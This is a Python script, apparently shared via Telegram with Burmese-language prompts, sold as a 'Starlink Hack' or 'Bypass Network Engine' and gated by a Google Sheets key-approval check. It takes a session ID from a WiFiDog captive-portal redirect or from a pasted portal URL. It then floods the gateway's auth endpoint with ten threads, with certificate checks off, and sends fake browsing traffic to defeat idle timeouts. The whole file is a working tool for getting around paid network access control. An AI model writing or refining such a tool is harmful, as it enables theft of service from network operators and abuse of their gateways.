#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Turbo Network Engine v2 - Complete System
With Auto Installer, Banner Display & Manual URL Support
"""

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import subprocess
import importlib.util
from urllib.parse import urlparse, parse_qs, urljoin, unquote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
reset = "\033[00m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================

SHEET_ID = "1ZpI1hkkkvc1J41qDWvcAREKQCODbS1jXO91lDb8ZqJo"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    """Get unique system key for this device"""
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    """Fetch authorized keys from Google Sheets"""
    keys = []
    
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key:
                        keys.append(key)
            
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        f.write('\n'.join(keys))
                except:
                    pass
            return keys
    except:
        pass
    
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except:
        pass
    
    return keys

def check_approval():
    """Check if system key is approved"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    print(f"\n{bcyan}[!] Checking approval status...{reset}")
    
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    
    print(f"{white}[*] System Key: {system_key}{reset}")
    print(f"{white}[*] Authorized Keys: {len(authorized_keys)}{reset}")
    
    if system_key in authorized_keys:
        print(f"\n{bgreen}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ✓ KEY APPROVED ✓                                 ║")
        print(f"║                    Turbo Engine Unlocked                            ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ❌ KEY NOT APPROVED ❌                           ║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                  ║")
        print(f"║  {yellow}ID approvedအတွက် TGကိုဆက်သွယ်ပါ:{reset}                                 ║")
        print(f"║                                                                  ║")
        print(f"║     {bcyan}📱 Telegram:{reset}  @CYCLEA7                                     ║")
        
        print(f"║                                                                  ║")
        print(f"║  {yellow}သင့်ရဲ့ ID: {system_key}{reset}                                             ║")
        print(f"║  {yellow}ID ကို copyလုပ်ပြီး TGမှာပို့ပေးပါ{reset}                                        ║")
        print(f"║                                                                  ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        return False

# ===============================
# BANNER DISPLAY (from photo.py)
# ===============================
def display_banner():
    """လှပပြီး သပ်ရပ်သော Cyber Style Banner"""
    banner_text = f"""
{bred}    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃{bcyan}  ████████╗██╗   ██╗██████╗ ██████╗  ██████╗      {bred}┃
    ┃{bcyan}  ╚══██╔══╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗     {bred}┃
    ┃{bcyan}     ██║   ██║   ██║██████╔╝██████╔╝██║   ██║     {bred}┃
    ┃{bcyan}     ██║   ██║   ██║██╔══██╗██╔══██╗██║   ██║     {bred}┃
    ┃{bcyan}     ██║   ╚██████╔╝██║  ██║██████╔╝╚██████╔╝     {bred}┃
    ┃{bcyan}     ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝      {bred}┃
    ┃{bcyan}        >>> BYPASS NETWORK ENGINE <<<             {bred}┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
    """
    print(banner_text)
    time.sleep(1.5)

# ===============================
# AUTO INSTALLER
# ===============================
def auto_install_dependencies():
    """Auto install required dependencies"""
    required_packages = ['requests', 'urllib3']
    missing_packages = []
    
    print(f"{bcyan}[*] Checking dependencies...{reset}")
    
    for package in required_packages:
        if importlib.util.find_spec(package) is None:
            missing_packages.append(package)
    
    if missing_packages:
        print(f"{yellow}[!] Missing packages: {', '.join(missing_packages)}{reset}")
        print(f"{bcyan}[*] Installing dependencies...{reset}")
        
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet'])
                print(f"{green}[✓] Installed: {package}{reset}")
            except Exception as e:
                print(f"{red}[X] Failed to install {package}: {e}{reset}")
        
        print(f"{green}[✓] All dependencies installed!{reset}")
        time.sleep(1)
    else:
        print(f"{green}[✓] All dependencies already installed!{reset}")
        time.sleep(0.5)

# ===============================
# TURBO ENGINE CONFIG
# ===============================
PING_THREADS = 10  # Performance Optimized
MIN_INTERVAL = 0.01 # High Speed Keep-Alive
MAX_INTERVAL = 0.05
DEBUG = False
stop_event = threading.Event()

def check_real_internet():
    """Check if real internet is accessible"""
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def extract_sid_from_url(url):
    """Accurately extract 32-char SID from Portal URL"""
    decoded_url = unquote(url)
    match = re.search(r'sessionId=([a-fA-F0-9]{32})', decoded_url)
    if match: return match.group(1)
    match_hex = re.findall(r'[a-fA-F0-9]{32}', decoded_url)
    return match_hex[-1] if match_hex else None

def ghost_traffic_generator():
    """Simulate browsing traffic to prevent Idle Timeout"""
    targets = ["http://www.google.com", "http://connectivitycheck.gstatic.com", "http://www.bing.com"]
    while not stop_event.is_set():
        try:
            requests.get(random.choice(targets), timeout=5)
        except: pass
        time.sleep(15)

def high_speed_ping(auth_link, sid):
    """High speed ping thread for maintaining authentication"""
    session = requests.Session()
    ping_count = 0
    success_count = 0
    
    while not stop_event.is_set():
        try:
            start = time.time()
            r = session.get(auth_link, timeout=5, verify=False)
            elapsed = (time.time() - start) * 1000
            ping_count += 1
            success_count += 1
            
            sys.stdout.write(f"\r{bgreen}[✓]{reset} SID: {sid[:8]}.. | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}   ")
            sys.stdout.flush()
            
        except:
            ping_count += 1
        
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_turbo_engine():
    """Main turbo engine process with Manual URL Support"""
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    TURBO NETWORK ENGINE v2.5                        ║")
    print(f"║ [1] Auto Scan Mode   | [2] Manual URL Paste Mode                    ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}\n")
    
    choice = input(f"{bcyan}[?]{reset} Select Mode [1-2]: ").strip()
    sid = None

    if choice == '2':
        url_in = input(f"\n{bcyan}[+]{reset} Paste Portal URL: ").strip()
        sid = extract_sid_from_url(url_in)
        if not sid:
            print(f"{red}[X] Error: Valid 32-char SID not found in URL!{reset}")
            time.sleep(2)
            return

    print(f"\n{cyan}[*] Network Status:{reset}")
    if check_real_internet():
        print(f"    {green}[✓] Internet is already active{reset}")
    
    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r_detect = requests.get(test_url, allow_redirects=True, timeout=5)
            
            # Detect Gateway Info
            params = parse_qs(urlparse(r_detect.url).query)
            gw_addr = params.get('gw_address', ['192.168.110.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]

            if not sid:
                # Auto Scan Logic
                sid = extract_sid_from_url(r_detect.url)
                if not sid:
                    print(f"{yellow}[!] Auto SID failed. Please Enter URL manually.{reset}")
                    sid = extract_sid_from_url(input(f"{bcyan}[+]{reset} URL: "))
                    if not sid: continue

            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            print(f"\n{bgreen}[✓] ENGINE LIVE! Gateway: {gw_addr}{reset}")
            print(f"{purple}[*] Launching {PING_THREADS} Turbo Threads...{reset}")
            print(f"{yellow}[!] Keep Termux open in background!{reset}\n")

            # Start Ghost Traffic for deeper keep-alive
            threading.Thread(target=ghost_traffic_generator, daemon=True).start()

            for i in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            last_status = False
            while not stop_event.is_set():
                is_connected = check_real_internet()
                if is_connected and not last_status:
                    print(f"\n{green}[✓] Internet Bypass Successful!{reset}")
                elif not is_connected and last_status:
                    print(f"\n{red}[X] Internet Disconnected! Attempting re-auth...{reset}")
                    break
                last_status = is_connected
                time.sleep(10)

        except KeyboardInterrupt:
            raise
        except:
            time.sleep(5)

# ===============================
# MENU SYSTEM
# ===============================
def show_menu():
    """Display main menu"""
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"""
{bcyan}╔══════════════════════════════════════════════════════════════════╗
║                         MAIN MENU                                     ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║     {bgreen}[1]{reset} {cyan}Starlink Hack{reset} - Start Turbo Network Engine                    ║
║     {bred}[2]{reset} {cyan}Exit{reset} - Close the program                               ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    while True:
        try:
            choice = input(f"{bcyan}[?]{reset} Select option [1-2]: ").strip()
            if choice == '1':
                return 'starlink'
            elif choice == '2':
                return 'exit'
            else:
                print(f"{red}[!] Invalid option!{reset}")
        except KeyboardInterrupt:
            return 'exit'

# ===============================
# MAIN ENTRY POINT
# ===============================
def main():
    if not check_approval():
        sys.exit(1)
    
    auto_install_dependencies()
    
    while True:
        choice = show_menu()
        if choice == 'starlink':
            try:
                stop_event.clear()
                start_turbo_engine()
            except KeyboardInterrupt:
                stop_event.set()
                print(f"\n{red}Turbo Engine Shutdown... Returning to menu...{reset}")
                time.sleep(1.5)
                continue
        elif choice == 'exit':
            print(f"\n{green}[✓] Thank you for using Turbo Network Engine!{reset}")
            sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{green}Your System Key: {get_system_key()}{reset}")
        sys.exit(0)
    
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        print(f"{red}Fatal Error: {e}{reset}")
        sys.exit(1)
